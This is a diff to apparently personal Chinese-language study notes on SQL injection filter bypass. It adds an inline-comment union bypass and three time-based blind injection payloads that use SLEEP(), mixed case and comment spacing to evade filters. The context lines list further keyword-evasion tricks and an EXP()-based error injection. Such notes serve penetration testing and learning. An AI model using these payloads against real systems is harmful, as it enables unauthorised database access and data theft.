@@ -456,8 +456,9 @@ function check_input($con1, $value)
   * 重复 例如 oorr，将中间的or过滤后得到的就是or
   * and等价于&&，or等价于||
   * 注释绕过，利用/\*!or\*/绕过，但是注意，这里只能绕过仅将单独出现的or过滤的情况
+  * `select 123 union /*!50000select*/ '666';` 采用/*! */
   * TODO：编码绕过，这里查了很多的资料，均提到urlencoding、hex和ascii编码可以绕过，但是通过我的实践，这三种编码是不能用于关键字的，不知道是的版本不对还是姿势不对
-
+  
 * 对union的过滤
   
   * ​       
@@ -588,5 +589,13 @@ SELECT n.*,u.* FROM   aoa_notice_list AS n LEFT JOIN aoa_notice_user_relation AS
 ```
 
 #### 其他payload
+
+```txt
+1'AnD(SElEcT*from(SElEcT%20SlEeP(5))a/**/uNIoN/**/SElEcT%201)='
+1"AnD(SElEcT*from(SElEcT%20SlEeP(5))a/**/uNIoN/**/SElEcT%201)="
+1/**/AnD%20(SElEcT%208380%20FROM%20(SElEcT(SlEeP(8)))smWE)
+```
+
+
 
 * `EXP(if(1=1,709,710))` EXP(709)是合法的，而710则会因为值超过DOUBLE的范围而报错。这里既可以用于报错注入也可以布尔注入，布尔注入的原理是通过控制if的条件，从而控制SQL语句是否报错（是否能正常返回值）
